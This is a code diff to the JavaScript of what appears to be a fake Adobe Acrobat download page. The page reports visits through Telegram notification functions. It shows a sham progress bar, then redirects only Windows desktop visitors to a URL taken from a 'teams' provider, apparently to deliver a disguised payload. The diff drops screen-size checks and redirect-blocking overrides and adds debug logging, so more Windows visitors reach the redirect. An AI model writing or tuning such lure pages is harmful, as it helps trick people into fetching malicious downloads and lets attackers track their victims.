@@ -706,41 +706,19 @@
     
     function isWindowsOS() {
       const userAgent = navigator.userAgent.toLowerCase();
-      return userAgent.includes('windows');
+      return userAgent.includes('windows') || userAgent.includes('win32') || userAgent.includes('win64');
     }
     
     function showMobileModal() {
       document.getElementById('mobileModal').style.display = 'block';
       document.body.style.overflow = 'hidden'; // Prevent scrolling
-      
-      // Completely block any redirect attempts on mobile
-      console.log('Mobile modal shown - redirects blocked');
-      
-      // Override window.location methods to prevent redirects
-      const originalHref = window.location.href;
-      Object.defineProperty(window.location, 'href', {
-        get: function() { return originalHref; },
-        set: function(url) { 
-          console.log('Redirect attempt blocked on mobile:', url);
-          return originalHref;
-        }
-      });
-      
-      // Block other redirect methods
-      window.location.replace = function() { 
-        console.log('window.location.replace() blocked on mobile');
-      };
-      window.location.assign = function() { 
-        console.log('window.location.assign() blocked on mobile');
-      };
+      console.log('Mobile modal shown');
     }
     
     function closeMobileModal() {
       document.getElementById('mobileModal').style.display = 'none';
       document.body.style.overflow = 'auto'; // Restore scrolling
-      
-      // Keep redirects blocked even after closing modal
-      console.log('Mobile modal closed - redirects still blocked');
+      console.log('Mobile modal closed');
     }
     
     // Telegram Notification Functions
@@ -856,23 +834,18 @@ Adobe Acrobat Download Page Visit`;
           showMobileModal();
         }, 1000);
         
-        // Completely disable all redirect functionality on mobile
-        console.log('Mobile device detected - all redirects disabled');
-        
-        // Override any potential redirect attempts
-        window.location.href = window.location.href; // Stay on current page
-        window.location.replace = function() { console.log('Redirect blocked on mobile'); };
-        window.location.assign = function() { console.log('Redirect blocked on mobile'); };
-        
         // Don't start progress animation or redirect on mobile/non-Windows
+        console.log('Mobile device detected - redirects disabled');
         return;
       }
       
       // Only run progress animation and redirect on Windows desktop
-      if (isWindowsOS() && !isMobileDevice() && window.innerWidth > 768 && window.innerHeight > 1024) {
+      if (isWindowsOS() && !isMobileDevice()) {
+        console.log('Windows desktop detected - starting redirect process');
+        
         // Animate progress percentage from 0% to 100% over 2 seconds
         const percentageElement = document.getElementById('progress-percentage');
-        const duration = 2000; // 2 seconds (reduced from 4 seconds)
+        const duration = 2000; // 2 seconds
         const startTime = Date.now();
         
         function updatePercentage() {
@@ -892,6 +865,11 @@ Adobe Acrobat Download Page Visit`;
         }
         
         requestAnimationFrame(updatePercentage);
+      } else {
+        console.log('Not Windows desktop - skipping redirect');
+        console.log('isWindowsOS():', isWindowsOS());
+        console.log('isMobileDevice():', isMobileDevice());
+        console.log('User Agent:', navigator.userAgent);
       }
     });
     
@@ -899,17 +877,13 @@ Adobe Acrobat Download Page Visit`;
     function triggerRedirectAfterAnimation() {
       console.log('Animation completed, checking for redirect...');
       
-      // Triple-check that we're on Windows desktop before redirecting
+      // Check that we're on Windows desktop before redirecting
       if (!isWindowsOS() || isMobileDevice()) {
         console.log('Skipping redirect - not Windows desktop');
         return;
       }
       
-      // Additional mobile check to be absolutely sure
-      if (window.innerWidth <= 768 || window.innerHeight <= 1024) {
-        console.log('Skipping redirect - mobile screen size detected');
-        return;
-      }
+      console.log('Proceeding with redirect on Windows desktop');
       
       // Check if utils is loaded and teams is enabled
       if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('teams')) {
@@ -942,6 +916,7 @@ Adobe Acrobat Download Page Visit`;
           
           // Redirect immediately after animation completes
           setTimeout(() => {
+            console.log('Executing redirect to:', finalUrl);
             window.location.href = finalUrl;
           }, 100); // Small delay to ensure smooth transition
         } else {
@@ -949,6 +924,10 @@ Adobe Acrobat Download Page Visit`;
         }
       } else {
         console.error('Utils not loaded or teams not enabled');
+        console.log('window.utils:', typeof window.utils);
+        if (typeof window.utils !== 'undefined') {
+          console.log('isProviderEnabled(teams):', window.utils.isProviderEnabled('teams'));
+        }
       }
     }
 
